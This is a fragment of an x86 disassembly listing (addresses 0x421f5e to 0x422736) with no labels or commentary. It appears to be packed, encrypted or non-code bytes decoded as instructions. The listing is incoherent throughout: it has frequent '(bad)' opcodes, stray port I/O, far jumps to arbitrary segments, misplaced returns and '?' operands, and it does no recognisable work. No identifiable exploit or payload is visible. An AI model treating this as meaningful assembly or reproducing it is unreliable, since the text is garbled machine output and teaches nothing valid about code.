  421f5e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f60:	xchg   ecx,eax
  421f61:	jmp    0x32b3dd36
  421f66:	in     al,dx
  421f67:	xchg   edx,eax
  421f68:	cmp    esp,ebp
  421f6a:	ficomp DWORD PTR [esi+ebx*8-0x588456bd]
  421f71:	mov    ds:0xd29f9594,eax
  421f76:	retf   
  421f77:	jl     0x421f69
  421f79:	pop    esp
  421f7a:	cwde   
  421f7b:	outs   dx,DWORD PTR ds:[esi]
  421f7c:	pop    esi
  421f7d:	sbb    ecx,DWORD PTR [ebx+0x4be8faf7]
  421f83:	mov    edx,0x273ef4ac
  421f88:	inc    edi
  421f89:	jns    0x421fac
  421f8b:	pop    ecx
  421f8c:	std    
  421f8d:	xchg   DWORD PTR [ecx+0x7a],esi
  421f90:	mov    bl,0x95
  421f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f93:	loope  0x421ffc
  421f95:	pop    DWORD PTR [ebx+0x56]
  421f98:	mov    ebp,0xd38d1316
  421f9d:	aas    
  421f9e:	arpl   WORD PTR [eax-0x5a737d],sp
  421fa4:	ret    0x878f
  421fa7:	sbb    esi,edi
  421fa9:	cmp    DWORD PTR [esi+0x2f19e0cd],ebp
  421faf:	mov    ds:0xf817a80e,al
  421fb4:	cdq    
  421fb5:	aam    0x8
  421fb7:	ja     0x421f3f
  421fb9:	and    DWORD PTR [eax],ecx
  421fbb:	lds    edi,FWORD PTR [edx+0x38f4213]
  421fc1:	sub    eax,edx
  421fc3:	mov    eax,0x3c70e6d3
  421fc8:	mov    ecx,0xca447777
  421fcd:	shr    DWORD PTR [ebp+0x2],cl
  421fd0:	inc    esp
  421fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fd2:	sub    DWORD PTR [ecx+esi*2+0x35],ebx
  421fd6:	ret    
  421fd7:	cwde   
  421fd8:	bound  esi,QWORD PTR [ebx]
  421fda:	mov    ah,BYTE PTR [edi+esi*8-0x720d7be2]
  421fe1:	cmp    esp,DWORD PTR [esi]
  421fe3:	mov    esi,0xb12ff616
  421fe8:	xor    bh,BYTE PTR [eax+eax*4-0x4b]
  421fec:	iret   
  421fed:	je     0x421f7c
  421fef:	or     eax,0xf14baf58
  421ff4:	adc    eax,0xa45fa1fe
  421ff9:	and    al,0xfa
  421ffb:	inc    bx
  421ffd:	lods   eax,DWORD PTR ds:[esi]
  421ffe:	cdq    
  421fff:	retf   
  422000:	loop   0x422063
  422002:	dec    esp
  422003:	jb     0x42203e
  422005:	stos   DWORD PTR es:[edi],eax
  422006:	jp     0x421f97
  422008:	inc    al
  42200a:	mov    eax,DWORD PTR gs:[ebx]
  42200d:	test   eax,0xf63ce811
  422012:	fcom   st(0)
  422014:	lock imul eax,edx,0xdc309b7c
  42201b:	in     al,dx
  42201c:	in     eax,dx
  42201d:	dec    ecx
  42201e:	(bad)  
  42201f:	jl     0x42205f
  422021:	repz mov WORD PTR ds:0x67e9291,gs
  422028:	mov    bl,0x53
  42202a:	cmp    ebx,edx
  42202c:	cmp    ebp,DWORD PTR [ecx]
  42202e:	sbb    ah,dl
  422030:	or     DWORD PTR [ebp+0xe],ecx
  422033:	out    dx,al
  422034:	mov    ss,WORD PTR [esi]
  422036:	dec    edx
  422037:	outs   dx,DWORD PTR ds:[si]
  422039:	add    DWORD PTR [ebp-0x445b3510],edi
  42203f:	push   es
  422040:	xchg   edi,eax
  422041:	sub    eax,0x9cb6cd62
  422046:	sbb    DWORD PTR [eax-0x57e51271],ecx
  42204c:	jne    0x421fdf
  42204e:	xor    al,0x8e
  422050:	je     0x4220ab
  422052:	fld    QWORD PTR [edi]
  422054:	adc    esp,DWORD PTR [ecx-0x4b]
  422057:	out    0x6c,al
  422059:	bound  ebp,QWORD PTR [esi]
  42205b:	jne    0x422090
  42205d:	sbb    bh,0xf7
  422060:	adc    al,0xf
  422062:	fwait
  422063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422064:	mov    bl,0x40
  422066:	icebp  
  422067:	ret    
  422068:	fcom   QWORD PTR [edi+0x2941b897]
  42206e:	sahf   
  42206f:	jne    0x42201d
  422071:	(bad)  
  422072:	loope  0x422017
  422074:	xchg   ebp,eax
  422075:	pop    ebx
  422076:	jae    0x42200e
  422078:	and    edx,DWORD PTR [edi-0x1fb7885d]
  42207e:	adc    eax,0x44711d8e
  422083:	mov    edi,0xd33a2ef8
  422088:	loop   0x422101
  42208a:	push   ebp
  42208b:	scas   al,BYTE PTR es:[edi]
  42208c:	jmp    0xeb50:0x55c9bb95
  422093:	adc    cl,BYTE PTR [edi+ecx*1+0x2f814ff2]
  42209a:	jns    0x42205f
  42209c:	push   ds
  42209d:	add    eax,DWORD PTR [ecx+0x6e]
  4220a0:	push   edi
  4220a1:	mov    dh,BYTE PTR [esi-0x27adb95d]
  4220a7:	leave  
  4220a8:	or     DWORD PTR ds:0xaa6cfea2,esi
  4220ae:	pop    ebx
  4220af:	pusha  
  4220b0:	xor    edi,ecx
  4220b2:	inc    ebp
  4220b3:	jmp    0xb126:0x2c47441b
  4220ba:	gs popa 
  4220bc:	mov    eax,0xe3a68456
  4220c1:	pushf  
  4220c2:	bnd js 0x42210e
  4220c5:	test   al,0xc3
  4220c7:	push   es
  4220c8:	adc    BYTE PTR [ecx],0x86
  4220cb:	aaa    
  4220cc:	mov    ecx,DWORD PTR [edx-0xa560d3a]
  4220d2:	cmc    
  4220d3:	leave  
  4220d4:	or     eax,0x658c35ff
  4220d9:	inc    edi
  4220da:	mov    dh,0xd3
  4220dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220dd:	rcr    BYTE PTR [edx+eiz*1-0x78],0x6f
  4220e2:	push   edi
  4220e3:	clc    
  4220e4:	retf   
  4220e5:	rep outs dx,BYTE PTR ds:[esi]
  4220e7:	pop    esi
  4220e8:	repz jl 0x42213e
  4220eb:	mov    ds:0x98febe50,eax
  4220f0:	pop    ds
  4220f1:	aas    
  4220f2:	jp     0x4220e5
  4220f4:	sahf   
  4220f5:	lock ins DWORD PTR es:[edi],dx
  4220f7:	cdq    
  4220f8:	and    al,0x87
  4220fa:	push   es
  4220fb:	adc    DWORD PTR [ecx],ecx
  4220fd:	sbb    ebx,eax
  4220ff:	mov    ds:0xb81a0f9e,al
  422104:	pop    eax
  422105:	out    0x14,eax
  422107:	fdivr  DWORD PTR ds:0xdf1acbae
  42210d:	add    edx,ebx
  42210f:	sub    ch,ah
  422111:	sub    BYTE PTR [ebp-0x43],dh
  422114:	(bad)  
  422115:	out    dx,al
  422116:	mov    ebx,0xb546a881
  42211b:	repnz xchg esp,eax
  42211d:	dec    edi
  42211e:	and    al,0xa9
  422120:	xlat   BYTE PTR ds:[ebx]
  422121:	(bad)  
  422122:	and    ah,al
  422124:	pop    ds
  422125:	xchg   esp,eax
  422126:	pop    eax
  422127:	sbb    BYTE PTR [edi+edi*2],bh
  42212a:	inc    esp
  42212b:	hlt    
  42212c:	xor    BYTE PTR [edi-0x18095bd1],0xff
  422133:	cmp    BYTE PTR [eax+edx*8],0x4d
  422137:	xor    al,0x7c
  422139:	rcr    DWORD PTR [edx+0x14],cl
  42213c:	pop    esp
  42213d:	popa   
  42213e:	fsub   st(2),st
  422140:	clc    
  422141:	cdq    
  422142:	(bad)  
  422144:	or     esi,ecx
  422146:	jb     0x4220cd
  422148:	sub    eax,0x9ac9576d
  42214d:	mov    edx,ebx
  42214f:	and    eax,0x4f3df26f
  422154:	icebp  
  422155:	idiv   BYTE PTR [ebx]
  422157:	push   eax
  422158:	inc    ebx
  422159:	retf   0x6830
  42215c:	mov    DWORD PTR [edi],ecx
  42215e:	cs jp  0x4221bb
  422161:	rcr    cl,1
  422163:	xchg   ecx,eax
  422164:	sub    al,0xf
  422166:	or     ebp,DWORD PTR [ebx-0x3782afb]
  42216c:	loop   0x422118
  42216e:	lock or DWORD PTR [edx-0x50],esp
  422172:	mov    bl,0xe2
  422174:	(bad)  
  422175:	cwde   
  422176:	xor    al,0x83
  422178:	dec    esi
  422179:	mov    bh,0x32
  42217b:	out    0xb8,eax
  42217d:	and    BYTE PTR [ebx-0x8acadbb],ah
  422183:	pop    eax
  422184:	fisub  WORD PTR [edx+0x49]
  422187:	pmulhw mm3,QWORD PTR [eax]
  42218a:	iret   
  42218b:	and    al,0x9e
  42218d:	dec    ecx
  42218e:	aas    
  42218f:	mov    eax,0x18895f52
  422194:	cmp    BYTE PTR [ebp+0x5a],0xb9
  422198:	mov    ebx,0x34e69cfd
  42219d:	dec    esi
  42219e:	mov    ebx,0x54e9be9
  4221a3:	mov    al,0x26
  4221a5:	int    0x81
  4221a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221a8:	dec    BYTE PTR [ebp+0x7b]
  4221ab:	scas   al,BYTE PTR es:[edi]
  4221ac:	es icebp 
  4221ae:	adc    DWORD PTR [esi],esi
  4221b0:	(bad)  
  4221b1:	daa    
  4221b2:	es cs inc ecx
  4221b5:	jg     0x4221ee
  4221b7:	(bad)  [edi-0xb]
  4221ba:	push   ebx
  4221bb:	clc    
  4221bc:	pop    eax
  4221bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221be:	stc    
  4221bf:	adc    BYTE PTR [ecx],dl
  4221c1:	test   al,0x7a
  4221c3:	push   edi
  4221c4:	xor    al,0x7d
  4221c6:	mov    ecx,DWORD PTR [esp+ebx*8+0x7d]
  4221ca:	fmulp  st(7),st
  4221cc:	xlat   BYTE PTR ds:[ebx]
  4221cd:	sub    eax,ecx
  4221cf:	or     eax,0x30892c02
  4221d4:	xchg   ebx,eax
  4221d5:	cdq    
  4221d6:	dec    edx
  4221d7:	and    DWORD PTR [edi+0x104dd8f6],esi
  4221dd:	push   0x370f3802
  4221e2:	jle    0x422202
  4221e4:	retf   0xd672
  4221e7:	(bad)  
  4221ea:	aaa    
  4221eb:	xor    eax,0x9b3929d2
  4221f0:	fstp   DWORD PTR [edi-0x7]
  4221f3:	sub    DWORD PTR [edx],ebx
  4221f5:	lds    ebx,FWORD PTR [edx+0x3aee0d59]
  4221fb:	sub    DWORD PTR [ebp-0x7ebd39fa],ecx
  422201:	inc    ecx
  422202:	dec    ecx
  422203:	(bad)  
  422204:	sbb    dl,BYTE PTR [edx-0x28]
  422207:	xchg   ebx,eax
  422208:	mov    ecx,DWORD PTR [ebx+0x6f]
  42220b:	dec    eax
  42220c:	(bad)  
  42220d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42220e:	sbb    DWORD PTR es:[ebp+0x37b537db],ebp
  422215:	adc    DWORD PTR [eax-0x12],esi
  422218:	mov    bl,0x28
  42221a:	adc    eax,0xe4c7423a
  42221f:	mov    ch,0x99
  422221:	inc    ebx
  422222:	lock add bl,cl
  422225:	push   eax
  422226:	pop    edx
  422227:	mov    WORD PTR [edi+0x70988e7e],cs
  42222d:	inc    ebx
  42222e:	fcom   DWORD PTR [edx+0x6e]
  422231:	add    BYTE PTR [eax+0x259f8d34],bh
  422237:	pop    esi
  422238:	daa    
  422239:	sbb    al,0xac
  42223b:	and    al,0xeb
  42223d:	sbb    eax,esi
  42223f:	frstor [ecx+0x20]
  422242:	mov    esi,0xd65c415e
  422247:	retf   
  422248:	push   0xffffffe8
  42224a:	sahf   
  42224b:	push   0x1c
  42224d:	cmp    esp,DWORD PTR [ebx+0x58]
  422250:	inc    BYTE PTR [edx-0x54]
  422253:	jne    0x422286
  422255:	lea    ebx,[edi-0x67e7280f]
  42225b:	outs   dx,DWORD PTR ds:[esi]
  42225c:	daa    
  42225d:	call   0xb0485b5d
  422262:	(bad)  [esi+0x47]
  422265:	enter  0xe17f,0x34
  422269:	inc    esp
  42226a:	jle    0x4222ab
  42226c:	sti    
  42226d:	addr16 jne 0x4222d4
  422270:	cmp    BYTE PTR [esi+0x3c],dh
  422273:	mov    ebp,0x7ace56cb
  422278:	mov    WORD PTR [edi-0x5cfc2d62],ds
  42227e:	mov    bh,0xcd
  422280:	sbb    eax,0xc6e57ddd
  422285:	xor    al,0xd6
  422287:	sub    BYTE PTR [edi-0x49],ch
  42228a:	xchg   esp,eax
  42228b:	push   eax
  42228c:	test   al,0xc9
  42228e:	cld    
  42228f:	mov    edx,0x7c1047a
  422294:	fsub   DWORD PTR [eax+0x5b]
  422297:	ror    BYTE PTR [ecx],cl
  422299:	sub    bl,BYTE PTR [edx-0x7]
  42229c:	push   0x64f56435
  4222a1:	inc    esi
  4222a2:	out    0xe5,al
  4222a4:	test   al,0x78
  4222a6:	add    eax,0x102af485
  4222ab:	cmp    al,BYTE PTR ds:0xa96deedc
  4222b1:	bound  ebp,QWORD PTR [ecx-0x2a]
  4222b4:	addr16 in eax,dx
  4222b6:	sub    ah,0x81
  4222b9:	pusha  
  4222ba:	jp     0x42226c
  4222bc:	jns    0x4222f3
  4222be:	dec    eax
  4222bf:	jo     0x4222d3
  4222c1:	inc    ebp
  4222c2:	dec    edx
  4222c3:	or     al,BYTE PTR [edi]
  4222c5:	pop    ds
  4222c6:	inc    eax
  4222c7:	xlat   BYTE PTR ds:[ebx]
  4222c8:	test   al,0xbc
  4222ca:	jl     0x422266
  4222cc:	or     ecx,DWORD PTR [edi]
  4222ce:	jns    0x422262
  4222d0:	popf   
  4222d1:	hlt    
  4222d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222d3:	bound  ebx,QWORD PTR [esi+eiz*4+0x588479a8]
  4222da:	aaa    
  4222db:	cdq    
  4222dc:	add    eax,0x90f8abeb
  4222e1:	lock (bad) 
  4222e3:	(bad)  
  4222e5:	lea    ebp,[eax-0x706ecb5c]
  4222eb:	pop    es
  4222ec:	mov    bh,0x9
  4222ee:	int    0x85
  4222f0:	push   edx
  4222f1:	repz mov bl,0x43
  4222f4:	aaa    
  4222f5:	idiv   bl
  4222f7:	rcl    DWORD PTR [edi+0x13757a6f],0x7
  4222fe:	aam    0xff
  422300:	xor    ecx,ecx
  422302:	push   ebp
  422303:	push   edi
  422304:	into   
  422305:	aas    
  422306:	jge    0x4222e1
  422308:	mov    al,ds:0x99c8f0b6
  42230d:	sub    eax,0xad006202
  422312:	or     al,0x11
  422314:	pop    eax
  422315:	dec    ecx
  422316:	mov    BYTE PTR [eax],bl
  422318:	call   0x9846:0x62c0ca66
  42231f:	and    DWORD PTR [eax],0x17
  422322:	call   0x187b:0xd0ba6d0
  422329:	mov    al,bh
  42232b:	mov    ebp,edi
  42232d:	pop    es
  42232e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42232f:	xchg   edx,eax
  422330:	inc    BYTE PTR [esi-0x3646f086]
  422336:	out    dx,eax
  422337:	repz inc esi
  422339:	pop    ebp
  42233a:	dec    edx
  42233b:	imul   eax,ebp,0x46
  42233e:	fst    st(7)
  422340:	mov    ds:0x81c75120,al
  422345:	fdivr  st(6),st
  422347:	fst    DWORD PTR [eax-0x5de21392]
  42234d:	popf   
  42234e:	and    DWORD PTR [ebx+0x4],ecx
  422351:	aas    
  422352:	call   0x185818af
  422357:	xchg   DWORD PTR [edx],ecx
  422359:	out    0xbb,eax
  42235b:	xchg   ebx,eax
  42235c:	test   BYTE PTR [ecx],ah
  42235e:	std    
  42235f:	sub    eax,0x946add32
  422364:	mov    eax,ds:0x9dcc1320
  422369:	xor    DWORD PTR [ebx-0x8],eax
  42236c:	pop    esp
  42236d:	imul   ebx,DWORD PTR [edx-0x46],0x1d
  422371:	and    BYTE PTR [edx-0x5d],ch
  422374:	clc    
  422375:	shr    BYTE PTR [edi],cl
  422377:	mov    al,ds:0x473bcf56
  42237c:	pop    ecx
  42237d:	loope  0x4223f2
  42237f:	xchg   ebx,eax
  422380:	cmp    DWORD PTR [edx],ecx
  422382:	fsubr  DWORD PTR [edi]
  422384:	(bad)  
  422385:	in     eax,0x65
  422387:	or     ah,dh
  422389:	and    al,0xe1
  42238b:	adc    eax,0x63e762d5
  422391:	cmp    eax,0x1b320a35
  422396:	fs gs pop eax
  422399:	sbb    DWORD PTR [esi+eax*1],ecx
  42239c:	imul   DWORD PTR [ebp-0x5f]
  42239f:	cdq    
  4223a0:	mov    al,0xe2
  4223a2:	pop    ebx
  4223a3:	scas   al,BYTE PTR es:[edi]
  4223a4:	ror    DWORD PTR [edi-0x6],1
  4223a7:	call   FWORD PTR [ecx+0x3b0879a0]
  4223ad:	mov    edx,0xca07044f
  4223b2:	jmp    0xc5019f69
  4223b7:	push   0xffffffb0
  4223b9:	pop    edx
  4223ba:	retf   
  4223bb:	mov    ebp,0x4cf183a7
  4223c0:	rcr    BYTE PTR [ecx],0x5d
  4223c3:	(bad)  
  4223c4:	lods   eax,DWORD PTR ds:[esi]
  4223c5:	scas   eax,DWORD PTR es:[edi]
  4223c6:	pop    edi
  4223c7:	push   ebp
  4223c8:	push   ss
  4223c9:	cwde   
  4223ca:	sbb    bh,BYTE PTR [eax+0x14ea5db1]
  4223d0:	aam    0x86
  4223d2:	(bad)  
  4223d3:	push   eax
  4223d4:	push   esi
  4223d5:	scas   eax,DWORD PTR es:[edi]
  4223d6:	mov    ch,0x60
  4223d8:	stc    
  4223d9:	imul   ebp,esp,0x43c5db
  4223df:	dec    eax
  4223e0:	push   0x2e
  4223e2:	sub    eax,0xdabac9d0
  4223e7:	xlat   BYTE PTR ds:[ebx]
  4223e8:	or     edx,ebp
  4223ea:	inc    eax
  4223eb:	nop
  4223ec:	sub    eax,0x20ec15e
  4223f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f2:	pushf  
  4223f3:	jbe    0x422376
  4223f5:	mov    ds:0x5baa631a,al
  4223fa:	dec    edi
  4223fb:	mov    esi,0xac61ef8f
  422400:	in     al,0x66
  422402:	xchg   esi,eax
  422403:	or     al,0xaf
  422405:	cmp    BYTE PTR [edx],cl
  422407:	sub    cl,BYTE PTR [esi+0x5a]
  42240a:	stos   BYTE PTR es:[edi],al
  42240b:	mov    bl,BYTE PTR [esi-0x60]
  42240e:	aas    
  42240f:	push   esi
  422410:	lods   eax,DWORD PTR ds:[esi]
  422411:	pop    ds
  422412:	loopne 0x422470
  422414:	sub    edx,DWORD PTR [eax]
  422416:	mov    ecx,DWORD PTR [ebp-0x39]
  422419:	aam    0xb5
  42241b:	sbb    DWORD PTR [eax+0x49],eax
  42241e:	int3   
  42241f:	push   ss
  422420:	sbb    edi,DWORD PTR [esi-0x5e]
  422423:	test   al,0x78
  422425:	pop    ecx
  422426:	pop    ecx
  422427:	cmc    
  422428:	pop    eax
  422429:	adc    DWORD PTR ds:0x723057af,ebp
  42242f:	mov    ds:0xa2280a1,al
  422434:	(bad)  
  422435:	inc    edx
  422436:	and    ebp,DWORD PTR [esi-0x3b630528]
  42243c:	repz scas eax,DWORD PTR es:[edi]
  42243e:	add    eax,0x571708ce
  422443:	xchg   ecx,eax
  422444:	mov    ebp,esi
  422446:	test   al,0xb0
  422448:	rcl    bh,0xf1
  42244b:	or     DWORD PTR [ecx+0x1c],edi
  42244e:	clc    
  42244f:	and    BYTE PTR ds:0x7cd3d04,dl
  422455:	fimul  WORD PTR [ecx]
  422457:	sbb    bl,BYTE PTR [esi]
  422459:	sub    DWORD PTR [ecx+0x506e4f63],esp
  42245f:	imul   edx,DWORD PTR [ecx+0x24],0x31096353
  422466:	xchg   esp,eax
  422467:	inc    ebp
  422468:	das    
  422469:	mov    esp,0x611824b9
  42246e:	stos   BYTE PTR es:[edi],al
  42246f:	(bad)  
  422470:	retf   0x739b
  422473:	out    0xf3,eax
  422475:	ret    
  422476:	mov    BYTE PTR [ebp+esi*2+0x5d],0x1d
  42247b:	ds ds xor ebp,edx
  42247f:	xchg   esp,eax
  422480:	pop    eax
  422481:	(bad)  
  422482:	mov    bh,0xf2
  422484:	xor    dh,BYTE PTR [edi+0x2872e28]
  42248a:	fld    DWORD PTR [ecx]
  42248c:	adc    BYTE PTR [edx+0x228f4fe0],al
  422492:	xchg   edi,eax
  422493:	fsubr  QWORD PTR [eax-0x1d16838b]
  422499:	xor    eax,0x74876331
  42249e:	ins    DWORD PTR es:[edi],dx
  42249f:	jmp    0x634c1dd8
  4224a4:	push   eax
  4224a5:	dec    edi
  4224a6:	xchg   DWORD PTR [edx+0x71],ebx
  4224a9:	loop   0x422521
  4224ab:	pop    edx
  4224ac:	call   0x9a226509
  4224b1:	jns    0x422491
  4224b3:	daa    
  4224b4:	lea    ebx,[ecx+ecx*2+0x9]
  4224b8:	(bad)  
  4224b9:	cmp    al,0x8b
  4224bb:	mov    bh,0x98
  4224bd:	push   esp
  4224be:	cld    
  4224bf:	aaa    
  4224c0:	rol    BYTE PTR [eax],0xf4
  4224c3:	(bad)  
  4224c4:	arpl   WORD PTR [ecx+0x6496428e],bx
  4224ca:	imul   BYTE PTR [edx+edx*1+0xb2ca42b]
  4224d1:	fcmovnu st,st(0)
  4224d3:	add    eax,0xe7774dd5
  4224d8:	(bad)  
  4224d9:	fld    DWORD PTR [edx-0x665320e]
  4224df:	outs   dx,DWORD PTR ds:[esi]
  4224e0:	add    eax,0x18282346
  4224e5:	mov    bh,0xfe
  4224e7:	or     eax,0x7a501265
  4224ec:	shl    DWORD PTR [ecx+0x59],cl
  4224ef:	pop    ds
  4224f0:	dec    esi
  4224f1:	sbb    BYTE PTR [edi+0x3],0xd5
  4224f5:	add    dh,BYTE PTR [edx-0x56d5de60]
  4224fb:	imul   edi,DWORD PTR [ebx+0x1f8294e5],0x9c28c0d0
  422505:	fdivr  DWORD PTR [ebp+edi*2-0x69a66bd4]
  42250c:	shl    BYTE PTR [edi-0x33],cl
  42250f:	iret   
  422510:	mov    edi,0x238fcac9
  422515:	jno    0x422580
  422517:	push   cs
  422518:	jo     0x42256b
  42251a:	push   es
  42251b:	jbe    0x4224c2
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	cmp    al,0xb9
  422520:	xchg   ebp,eax
  422521:	lahf   
  422522:	int    0xc5
  422524:	jae    0x4224e5
  422526:	mov    bl,0xca
  422528:	jle    0x42251d
  42252a:	hlt    
  42252b:	xor    eax,0x302f8c77
  422530:	js     0x4224c0
  422532:	clc    
  422533:	mov    eax,0xe8290230
  422538:	cmp    DWORD PTR [ebp+0x3],ebp
  42253b:	mov    ch,0x65
  42253d:	jbe    0x4224e4
  42253f:	arpl   WORD PTR [ebx],bx
  422541:	jae    0x422526
  422543:	dec    eax
  422544:	sub    edi,DWORD PTR [eax+edi*2-0x18]
  422548:	mov    ecx,0x4f98d7d0
  42254d:	jp     0x4224ff
  42254f:	rol    edi,0x76
  422552:	fcmovnb st,st(6)
  422554:	jmp    0x1032dfd5
  422559:	push   eax
  42255a:	or     cl,BYTE PTR [edi-0x17]
  42255d:	xchg   DWORD PTR [edx-0x3b],ecx
  422560:	cs jmp 0x73cbb35f
  422566:	mov    bh,BYTE PTR ds:0x90ff0fe
  42256c:	movq   QWORD PTR [ecx],mm4
  42256f:	sbb    al,0x63
  422571:	dec    esp
  422572:	push   ebx
  422573:	in     al,0x81
  422575:	sahf   
  422576:	shr    al,0xb5
  422579:	not    DWORD PTR [ebp-0x23bfedde]
  42257f:	cmp    edi,DWORD PTR [ecx]
  422581:	jnp    0x4225f4
  422583:	xchg   esi,eax
  422584:	scas   al,BYTE PTR es:[edi]
  422585:	adc    ch,0x10
  422588:	inc    ecx
  422589:	fmul   st,st(2)
  42258b:	mov    ?,WORD PTR [eax]
  42258d:	xchg   edi,eax
  42258e:	or     al,0xc1
  422590:	push   ecx
  422591:	xlat   BYTE PTR ds:[ebx]
  422592:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  422594:	mov    ebp,0x394bc6ab
  422599:	mov    ecx,0xc186c688
  42259e:	repnz push 0xe02946d7
  4225a4:	push   ss
  4225a5:	fsubr  DWORD PTR ds:0xd011b31b
  4225ab:	scas   al,BYTE PTR es:[edi]
  4225ac:	retf   
  4225ad:	xchg   ecx,eax
  4225ae:	push   ecx
  4225af:	icebp  
  4225b0:	les    ecx,FWORD PTR [ecx+0x66f180c9]
  4225b6:	pop    eax
  4225b7:	sahf   
  4225b8:	inc    esi
  4225b9:	stos   DWORD PTR es:[edi],eax
  4225ba:	ret    0x9e96
  4225bd:	(bad)  
  4225be:	outs   dx,DWORD PTR ds:[esi]
  4225bf:	retf   0x1d2
  4225c2:	push   ss
  4225c3:	out    dx,al
  4225c4:	jle    0x4225a6
  4225c6:	add    bh,BYTE PTR [edi-0x694807b7]
  4225cc:	(bad)  
  4225cd:	xchg   BYTE PTR [eax-0xe74e3e6],dl
  4225d3:	fsubr  DWORD PTR [eax+0x5d68ef21]
  4225d9:	push   esp
  4225da:	mov    DWORD PTR [eax+esi*8-0x14],edi
  4225de:	aam    0x7b
  4225e0:	push   edi
  4225e1:	push   es
  4225e2:	mov    ecx,?
  4225e4:	icebp  
  4225e5:	and    eax,0x30bbd47
  4225ea:	push   ds
  4225eb:	mov    edi,0xdb04c3ce
  4225f0:	int    0x30
  4225f2:	in     eax,0xe2
  4225f4:	jmp    0x3138fbe7
  4225f9:	mov    esp,0xcb526b0e
  4225fe:	pop    ebp
  4225ff:	xlat   BYTE PTR ds:[ebx]
  422600:	jnp    0x42267b
  422602:	jns    0x422612
  422604:	mov    esi,ebp
  422606:	leave  
  422607:	gs aaa 
  422609:	and    bh,ah
  42260b:	or     eax,edi
  42260d:	(bad)  
  42260e:	addr16 retf 
  422610:	cmp    DWORD PTR [ecx+0x5f4be4dc],ebp
  422616:	int3   
  422617:	and    eax,0x3ef35516
  42261c:	arpl   dx,di
  42261e:	sbb    eax,0xe51f003f
  422623:	xchg   ebx,eax
  422624:	jno    0x4225ff
  422626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422627:	imul   esp,DWORD PTR [esi+0x3e],0x62
  42262b:	test   eax,0x25d59acc
  422630:	jbe    0x4225f6
  422632:	pop    esp
  422633:	fdivr  DWORD PTR [edx-0x208f1905]
  422639:	stos   BYTE PTR es:[edi],al
  42263a:	sahf   
  42263b:	out    dx,eax
  42263c:	cmc    
  42263d:	(bad)  
  42263e:	daa    
  42263f:	outs   dx,BYTE PTR ds:[esi]
  422640:	mov    edi,0xf690c47c
  422645:	mov    dl,0x61
  422647:	push   eax
  422648:	out    dx,eax
  422649:	inc    esi
  42264a:	out    0x40,al
  42264c:	pop    ecx
  42264d:	cli    
  42264e:	cwde   
  42264f:	or     WORD PTR [edi],sp
  422652:	add    BYTE PTR [ebp-0x6db3aee6],dh
  422658:	inc    esi
  422659:	adc    BYTE PTR [ecx-0x7a211efa],ah
  42265f:	adc    al,BYTE PTR [esi+0x52d94944]
  422665:	(bad)  
  422666:	pop    ecx
  422667:	test   al,0xab
  422669:	mov    ds:0x1e4eb03e,eax
  42266e:	les    esi,FWORD PTR [edi-0x34dbeab9]
  422674:	pop    eax
  422675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422676:	push   edi
  422677:	jp     0x4226a3
  422679:	inc    edx
  42267a:	pop    eax
  42267b:	imul   esp,DWORD PTR ds:0xa527487,0x66f3d1a4
  422685:	xor    eax,0x5a174d12
  42268a:	mov    bl,BYTE PTR [ebx-0x52a27495]
  422690:	sub    DWORD PTR [eax+0x2b],ebp
  422693:	cld    
  422694:	mov    bl,0xf6
  422696:	mov    edi,0xadaa08a0
  42269b:	push   eax
  42269c:	clc    
  42269d:	or     al,0x71
  42269f:	lods   eax,DWORD PTR ds:[esi]
  4226a0:	mov    ss,WORD PTR [edx]
  4226a2:	addr16 stc 
  4226a4:	xchg   dx,ax
  4226a6:	and    ah,BYTE PTR [ebx-0x75436b50]
  4226ac:	and    dl,BYTE PTR ds:0x8597b3e
  4226b2:	or     edx,DWORD PTR [ebp+0x52]
  4226b5:	mov    ebp,0xdf067c50
  4226ba:	rcl    DWORD PTR [esi],1
  4226bc:	sti    
  4226bd:	mov    ah,0x9b
  4226bf:	sbb    al,0x72
  4226c1:	cmp    dl,dl
  4226c3:	or     cl,BYTE PTR [ebx-0x44]
  4226c6:	call   FWORD PTR [ebp+0x2e564903]
  4226cc:	lods   eax,DWORD PTR ds:[esi]
  4226cd:	sar    al,1
  4226cf:	ret    
  4226d0:	cmp    ah,al
  4226d2:	ins    BYTE PTR es:[edi],dx
  4226d3:	xor    DWORD PTR [ecx*1+0x7cde0af2],edx
  4226da:	pop    esp
  4226db:	outs   dx,BYTE PTR ds:[esi]
  4226dc:	pop    ecx
  4226dd:	push   eax
  4226de:	fbstp  TBYTE PTR [ebx+0x180b1844]
  4226e4:	mov    esp,0x273d3034
  4226e9:	pop    es
  4226ea:	sub    al,0xc7
  4226ec:	test   eax,0x2254e8a7
  4226f1:	outs   dx,BYTE PTR ds:[esi]
  4226f2:	mul    DWORD PTR [edx]
  4226f4:	ins    BYTE PTR es:[edi],dx
  4226f5:	mov    edx,0x96135c2e
  4226fa:	add    dl,BYTE PTR [ebp+0x35]
  4226fd:	outs   dx,BYTE PTR ds:[esi]
  4226fe:	cli    
  4226ff:	outs   dx,BYTE PTR ds:[esi]
  422700:	aad    0x86
  422702:	add    DWORD PTR [ecx-0x3240e688],esp
  422708:	not    BYTE PTR [edi+0x758a4cc4]
  42270e:	aaa    
  42270f:	pop    esi
  422710:	sub    ah,ah
  422712:	popf   
  422713:	iret   
  422714:	imul   ebx,DWORD PTR [ecx+0x68c40c4b],0x8a4f64f2
  42271e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422720:	mov    edi,0xe82f0c7e
  422725:	shr    DWORD PTR [ecx-0x39601d2],cl
  42272b:	jne    0x42273a
  42272d:	or     eax,0x672fd27f
  422732:	jg     0x42274e
  422734:	in     al,0xcf
  422736:	in     eax,0x36
